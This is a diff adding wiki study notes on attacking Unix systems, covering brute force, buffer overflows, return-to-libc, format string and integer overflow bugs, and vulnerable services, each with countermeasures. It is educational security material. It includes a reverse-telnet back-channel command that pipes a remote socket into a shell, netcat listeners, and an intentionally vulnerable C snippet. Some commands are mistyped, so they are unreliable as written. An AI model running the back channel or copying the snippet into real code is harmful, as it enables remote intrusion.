@@ -1,0 +1,241 @@
+= Hacking Unix =
+
+== Index ==
+
+	* [[#Remote Access|Remote Access]]
+	* Local Access
+
+== Remote Access ==
+
+An educated hacker will perform some prior steps before the hacking of a target network / machine. 
+
+	1. Footprinting. The Hacker will try to gather all the public avaiable info, with the purpose to profile the target. Tools: *whois*, *nslookup*, *dig*, *FOCA*. 
+	2. Scanning. After the footprinting it's important to identify all the entry points. Tools: *nmap*, *netcat*, *tcpdump*.
+	3. Enumeration. Probe and scan the identified services with the purpose of finding known vulnerabilities. Tools: *dnsenum*
+
+When the Hacker has finished all the steps above has all the information he need to perform a _successfull_ attack.  Now it's purpose is to gain access to a *remote target*. The most frequent methods used to gain Remote Access on a Unix machine are: 
+
+	1. [[#Exploit a listening service|Exploit a listening service]]
+	2. Route through a Unix system
+	3. [[#Remote Command Execution|Make a user (maybe through phishing techniques) run some malware to gain Remote Execution]]
+	4. Promiscous mode attack
+
+=== Exploit a listening Service ===
+
+there are two kind of _common_ attacks: bruteforce and data driven attack. 
+
+==== Bruteforce ====
+
+Bruteforce attack can be done against interactive login systems like *telnet*, *FTP* and similar. Also informations like user data obtained during scanning and enumeration can be used during a bruteforce attack. *Tools* used in bruteforce attack can be automated, an example is Hydra. 
+
+===== Countermeasures =====
+
+Enforce strong password policies, and compare them with dictionary manually or with programs like *CrackLib*. Also ditch old protocols like telnet in favor of encrypted remote connection mechanisms like *SSH*, *SRP* or *SFTP*. 
+
+==== Data Driven Attack ====
+
+This kind of attack is performed sending appositely crafted data to an active service causing undesiderable or unintended results. The most common type of Data Driven Attack are: *bufferoverflows* and *Input Validation* attack. 
+
+===== Buffer Overflows =====
+
+Occurs when a user or a process attempts to place data inside a buffer which dimension allocated is lesser than the data inserted. Normally a SEG FAULT is raised but it can lead to arbitrary code execution.
+
+{{file:./imgs/bufover.png}}
+
+In the simple buffer overflow attacks, the pupose of the attacker is to overwrite the *return stack pointer* with some _precompilated_ executable code. In summary is goal is to jump to injected code. Obviously this approach is very limited: what if the buffer exploited is not big enough to contain all the exploit code? Also in modern Operating Systems the stack is not executable, so this approach will not work. 
+
+A more interesting approach is called *Return-to-libc* Attack. It consist in the replacing of the *Return Pointer*, overflows the return address to a new location in existing executable code in the *libc* library. For example calling the *exec()* function bypassing the stack execution prevention. 
+
+`cat /proc/sel/map`, bash command to see the memory layout of a process.
+
+Instead of putting shellcode on stack, an attacker find the address of the `exec()` function with arg: `/bin/sh`, spawning a shell with the same privileges of the process exploited. 
+
+A generalization of the Return to libc attack is the Return oriented programming. 
+
+====== Countermeasures ======
+
+Secure coding practices like: validation of user-modifiable inputs, use of secure routines and reduction of root privileged code; also enabling of stack Smashing Protector (_default_) helps. Of course this first countermeasures regards programmers. A network administrator can also apply some countermeasures:
+
+	* disabling unused or dangerous services
+	* access control with TCP wrappers and iptables
+	* apply stack execution protection, and enable Address Space Layout Randomization. ASLR randomize process address space each time a process is created. 
+	  
+*add stack canary* 
+
+===== Format String Attacks =====
+
+A subtype of buffer overflows attack are the Format String Attacks, if some programmers omit the format string in a `printf()` family instruction like this: `printf(buf)` instead of `printf("%s", buf)`; in the former case a malicius user could add format strings to the variable gaining read or write access to memory location. 
+
+{{file:./imgs/formatstring.png}}
+
+====== Countermeasures ======
+
+Same as buffer overflows: use ASLR. Also modern compiler warn developer who misuse `*printf` functions.
+
+==== Input Validation Attacks ====
+
+These attacks work every time user input is not tested and, when needed, cleaned before execution. There are to main approaches to perform input validation: 
+
+	1. Black list malicious inputs; not very effective, it's difficult to know _apriori_ all the possible bad inputs. Strongly Discouraged.
+	2. White list valid inputs; maybe with regular expressions. Recommended. 
+	   
+
+===== Integer Overflow =====
+
+Integer variables can only handle values up to a maximum size. 16bit integer can store only 2^16^-1 values. 
+
+{{{c
+int16_t x = 60000;
+printf("%d", x); // -5536 
+}}}
+
+Vulnerable programs can be tricked into accepting large amounts of data bypassing data validation: 
+
+{{{C
+int16_t len = getInputLen();
+if (len > 256) { // if len is greater than 32757 it's considered negative
+	return -1;
+} else {
+	strncpy(buf, user_data, len); //strncpy consider len as a unsigned int16_t
+	// VULNERABLE TO BUFFEROVERFLOW
+}
+}}}
+
+====== Countermeasures ======
+
+Same as bufferoverflows, and also good programming practices.
+
+=== Remote Command Execution ===
+
+The goal of the attacker in this setting is to gain command-line (in Windows System) or shell (in unix) access to the target system. The remote command execution is done exploiting interactive shell access to remotely login: *telnet*, *rlogin*, or *ssh*; or exploiting non interactive services to execute commands. Sometimes, however, remote login services are blocked by firewall or are turned off. In this cases the attacker need a so called *Back Channel*. 
+
+==== Back Channel ====
+
+A back channel is a communication channel that originates from the target system. Users can be tricked to open such a channel using Social Engineering or trought malwares or phising emails. An example of black channel is *Reverse Telnet*. 
+
+*Reverse Telnet* is done in to steps. First the user runs the following commands in two separate windows on it's machine: 
+
+{{{bash
+$ nc -lnv -p 80
+}}}
+
+{{{bash
+$ nc -lnv -p 25
+}}}
+
+the first console act as a input console, and the second as a output console. Then the attacker, in same way, is able to run the following command on the target system: 
+
+{{{bash
+telnet ip_addr 80 | sh | ip_addr 25
+}}}
+
+this command opens to socket, the first socket on port 80, and pipe it's output in input to `sh`, then pipe the output of `sh` into the socket opened on port 25. 
+
+===== Countermeasures =====
+
+It's important to disallow unnecessary or unused services, remove X server from critical systems and run web server as `nobody` with no exec permission for telnet. Lastly some firewall consent to block connection from web server or internal systems. 
+
+==== Common targets for Remote Command Execution Attacks ====
+
+	* [[#FTP|FTP]]
+	* [[#Sendmail|Sendmail]]
+	* [[#Remote Procedure Call Services|RPC]]
+	* [[#NFS|NFS]]
+	* [[X11]]
+	* [[#DNS|DNS]]
+	* [[#SSH|SSH]]
+	* [[#OpenSSL|OpenSSL]]
+	* Apache
+
+
+===== FTP =====
+
+Sometimes FTP servers allow anonymous user to user to upload files, of course Anonymous access and the presence of word-writable directory represents a trouble. It's important to note that also misconfiguration may allow the traverse of directories that contain sensitive information. Lastly, it is important to consider that some vulnerability in `wu-ftp` allows arbitrary code execution (`site exec` command).
+
+
+====== Countermeasures ======
+
+Today there's no need to use FTP, but if is necessary it's important to: patch the FTP server, configure it carefully and of course disable world-writable directories and anonymous access.
+
+
+==== Sendmail ====
+
+Sendmail is one of the most common Mail Transfer Agent used on UNIX systems. Non patched versions have a lot of vulnerabilities and if misconfigured allows spammer to use *your* mail server to send junk mails.
+
+===== Countermeasures =====
+
+It's important to properly configure Sendmail and to patch it. 
+
+==== Remote Procedure Call Services ====
+
+RPC are an historical tool used to perform a initial form of distributed computing. RPC allow a client to call a procedure stored on a server. Some stock versions of UNIX have RPC services enabled by default. Basically RPC services are complex and have the need to run with root privileges; for this reason are a juicy target for attackers. 
+
+This kind of systems are used in big, complex and old systems (banks, healthcare, etc...) in which the upgrade of the IT infrastructure can produce the loss of important data or it's really expensive. 
+
+===== Countermeasures =====
+
+If not used disable RPC service, but if it is needed implement an access control list that allows only authorized systems. Apply also buffer overflow countermeasures and if possible configure Secure RPC or use it through a secure encrypted tunnel like VPN.
+
+==== NFS ====
+
+Network File System is used to allow transparent access to file and directories stored on a remote server from clients as if they were stored locally. Wrong configuration can lead to expose the entire filesystem to everyone on the network, and many buffer overflows vulnerabilities affect `mountd`, the NFS server software.
+
+===== Countermeasures =====
+
+Of course, if not needed, disable NFS; else implement client and user access controls to allow only authorized user to access the required files. It's fundamental to export only certain directories and not the entire filesystem. Lastly never include the server's local IP address, or localhost, in the list of systems allowed to mount the filesystem because weird interactions with other software like `portmapper` allow attacker to spoof requests.
+
+==== DNS ====
+
+DNS is one of the few services always needed in big organizations. One of the most common implementation of DNS for UNIX is `BIND`; it is a very complex and configurable software that can be exploited by malformed responses to DNS queries and can provide some degree of remote control over the server. 
+
+Another interesting, but old, kind of attack to DNS server is the DNS Cache Poisoning. *ADD INFO*
+
+===== Countermeasures =====
+
+As always disable BIND if not used, path and update it. Another important thing to do is to run the service as unprivileged user, or run it from a [[https://www.thegeekdiary.com/understanding-chroot-jail/|chroot jail]]. Alternative softwares for BIND exists like `djbdns`. Always check CVEs.
+
+==== X ====
+
+The X windows system is a client-server based graphical environment for UNIX systems ([[https://www.youtube.com/watch?v=p31-l7wFkKk|more on this]]). It's a fairly old software that is no longer maintained in favour of most newer _but not so adopted_  graphical environment like wayland.
+
+X was implemented with the old concept of mainframe architecture: a lot of client with little computing power, and a main mainframe with _a lot_ of computing power used to execute all the expensive tasks. The clients were used only to display graphical windows (graphical client) and the server did all the computing also of the position of the different windows on the screen, their size and so on. For this reason x clients have the ability to capture keystroke, kill windows, remap keyboard to send commands and similar. 
+
+Of course today all of this is not needed anymore, but in some old legacy stock unix systems this service can be active by default. There are a lot of tools that can be used to check a network for the presence of X server / clients:
+
+	* `xscan` is a tool that can scan an entire subnet looking for an open X server and log all keystroke to a log file. (free keylogger)
+	* `xwatchwin` even lets you see the windows users have open
+
+It's also possible to send keystroke to all users. 
+
+===== Countermeasures =====
+
+If really needed an X server can be secured avoiding `xhost + command`, using advanced authentication mechanisms and considering the use of encrypted tunneling functionalities such as SSH an VPN. But today there are more viable, easily configured and secure alternatives to X. 
+
+==== SSH ====
+
+SSH is a secure, encrypted, alternative to telnet. Of course it is no exempt from vulnerabilities, like [[#Integer Overflow|integers overflows]], problems in SSH packages and so on.
+
+===== Countermeasures =====
+
+Run patched an d update versions of the SSH serer, use the privilege separation feature like a `chroot jail`.
+
+
+==== OpenSSL ====
+
+OpenSSL is an open-source implementation of SSL and is the _de facto_ standard used of most servers. It had two  famous vulnerabilities, one that was exploited by the Slapper worm (more on this [[https://www.f-secure.com/v-descs/slapper.shtml|here]] and [[https://vxug.fakedoma.in/archive/Symantec/analysis-of-the-slapper-worm-03-en.pdf|here]]), and one was the [[https://heartbleed.com/|Heartbleed Bug]] that was caused by improper input validation. 
+
+===== Countermeasures =====
+
+Always run patched and update version of OpenSSL and disable SSLv2 if not needed. 
+
+==== Apache ====
+
+Apache is the prevalent web server, it is a complex and highly configurable software with vulnerabilities. Always check CVE. 
+
+===== Countermeasure =====
+
+Use latest version and apply security patches.
+
+== Local Access ==
+
+
